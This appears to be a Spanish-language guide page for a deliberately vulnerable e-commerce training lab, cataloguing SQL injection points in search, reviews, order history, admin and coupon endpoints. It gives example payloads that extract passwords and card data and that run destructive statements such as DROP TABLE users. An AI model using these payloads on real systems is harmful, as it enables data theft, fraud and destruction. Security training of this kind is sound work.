---
layout: default
title: SQL Injection
nav_order: 3
parent: Vulnerabilidades
---

# SQL Injection

## 3.1 Búsqueda y Filtros de Productos
- **Ubicación**: `/api/v1/products/search` y `/api/v1/products/filter`
- **Descripción**: Parámetros de búsqueda y filtros vulnerables a SQLi
- **Pasos**:
  1. Usar búsqueda de productos o filtros
  2. Inyectar payload SQL en parámetros
- **Payloads de ejemplo**:
  ```sql
  ' OR '1'='1
  ' UNION SELECT id,email,password,NULL,NULL FROM users--
  ' ORDER BY 10--
  category=' UNION SELECT id,email,password,NULL FROM users--
  price_max=' OR price > 1000 OR '1'='1
  ```
- **Criterio de éxito**: Obtener información de usuarios o manipular consulta
- **Impacto**: Acceso no autorizado a datos, bypass de filtros

## 3.2 Sistema de Reseñas
- **Ubicación**: `/api/v1/products/{id}/reviews`
- **Descripción**: Gestión de reseñas vulnerable a SQLi
- **Pasos**:
  1. Acceder a reseñas de producto
  2. Manipular parámetros de ordenamiento/filtrado
- **Payloads de ejemplo**:
  ```sql
  rating=' UNION SELECT password,email,username,NULL FROM users--
  order=' OR updatexml(1,concat(0x7e,(SELECT password FROM users LIMIT 1)),1)--
  ```
- **Criterio de éxito**: Extraer datos sensibles vía error-based SQLi
- **Impacto**: Fuga de información sensible

## 3.3 Historial de Pedidos
- **Ubicación**: `/api/v1/orders/history`
- **Descripción**: Consulta de pedidos vulnerable
- **Pasos**:
  1. Acceder al historial de pedidos
  2. Manipular parámetros de búsqueda/filtrado
- **Payloads de ejemplo**:
  ```sql
  order_id=' UNION SELECT card_number,expiry,cvv,NULL FROM payment_methods--
  date_from=' OR '1'='1' GROUP BY credit_card--
  ```
- **Criterio de éxito**: Acceder a información de pagos de otros usuarios
- **Impacto**: Robo de datos de tarjetas de crédito

## 3.4 Panel de Administración
- **Ubicación**: `/api/v1/admin/users` y `/api/v1/admin/orders`
- **Descripción**: Filtros y gestión administrativa vulnerable
- **Pasos**:
  1. Acceder como admin
  2. Usar filtros o búsqueda de usuarios/pedidos
- **Payloads de ejemplo**:
  ```sql
  '; DROP TABLE users--
  '; UPDATE users SET role='admin'--
  '; INSERT INTO payment_methods SELECT * FROM payment_methods--
  ```
- **Criterio de éxito**: Modificar datos o estructura de BD
- **Impacto**: Manipulación de base de datos, escalada de privilegios

## 3.5 Sistema de Cupones
- **Ubicación**: `/api/v1/coupons/validate`
- **Descripción**: Validación de cupones vulnerable
- **Pasos**:
  1. Intentar aplicar cupón
  2. Inyectar payload en código de cupón
- **Payloads de ejemplo**:
  ```sql
  ' OR discount_percent=100--
  ' UNION SELECT 100,'2025-12-31',NULL--
  ```
- **Criterio de éxito**: Bypass de validación de cupones
- **Impacto**: Manipulación de descuentos
